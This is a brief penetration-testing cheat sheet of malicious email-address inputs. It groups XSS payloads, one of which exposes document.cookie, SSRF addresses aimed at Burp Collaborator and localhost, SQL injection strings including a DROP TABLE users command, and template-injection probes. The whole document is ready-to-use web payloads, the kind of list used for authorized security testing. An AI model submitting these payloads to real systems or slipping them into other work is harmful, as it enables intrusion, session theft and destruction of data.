## These tests are performed on the email address field

## XSS (Cross-Site Scripting)
1. test+(<script>alert(1337)</script>)@example.com
2. test@example(<script>alert(1337)</script>).com
3. "<script>alert(1337)</script>@example.com
4. test@gmail.com'"><svg/onload=confirm(1)>
5. "><svg/onload=confirm(document.cookie)>"@x.y

## SSRF (Server-Side Request Forgery)
1. firstname.lastname@abc123.BurpCollaborator.net
2. username@burp-collab.net
3. firstname.lastname@[127.0.0.1]

## SQL Injection
1. "' OR 1=1 -- '"@example.com
2. "mail'); DROP TABLE users;--"@example.com

## SSTI (Server-Side Template Injection)
1. test+(${{7*7}})@example.com
2. “<%= 7 * 7 %>”@example.com
